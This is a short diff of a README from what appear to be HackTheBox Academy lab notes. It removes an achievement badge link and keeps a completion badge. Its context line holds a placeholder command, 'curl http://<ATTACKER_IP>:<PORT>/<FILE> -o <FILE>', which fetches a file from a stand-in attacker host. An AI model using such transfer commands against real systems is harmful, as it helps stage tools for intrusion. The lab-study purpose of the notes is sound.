@@ -207,10 +207,6 @@ curl http://<ATTACKER_IP>:<PORT>/<FILE> -o <FILE>
 * [Using Web Proxies](../../web/using-web-proxies/README.md)
 * [Nibbles â€” Machine Writeup](../../../easy-machines/nibbles/README.md)
 
-## Achievement
-
-[Your first battle](https://academy.hackthebox.com/achievement/badge/e29c6299-d5ce-11f0-9254-bea50ffe6cb4)
-
 ## Completion
 
 <a href="https://academy.hackthebox.com/achievement/badge/e29c6299-d5ce-11f0-9254-bea50ffe6cb4"><img src="./images/htb-getting-started-badge.png" width="120" alt="HTB Academy — Your first battle Badge"></a>
